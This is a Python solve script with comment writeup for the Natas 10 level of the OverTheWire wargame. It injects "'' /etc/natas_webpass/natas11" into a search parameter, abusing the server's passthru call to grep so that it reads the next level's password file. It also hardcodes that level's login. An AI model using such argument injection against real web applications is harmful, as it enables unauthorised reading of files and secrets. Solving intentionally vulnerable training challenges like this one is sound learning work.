#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path='/'

#Custom Headers
custom_headers=''


#Payload
#
command="'' /etc/natas_webpass/natas11"
payload=f'?needle={command}&submit=Search'
url=host+path+payload

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content.split('\n')[22][19:]
print(flag)


#WRITEUP
#This time we get the same thing but it has filters unlike the other one
# The filters block the use of & ; and |
# passthru("grep -i $key dictionary.txt");
# Even with this characters blocked grep allows us to read files using grep '' filename and since '' are not blocked entering
# '' /etc/natas_webpass/natas11
# will give us the flag
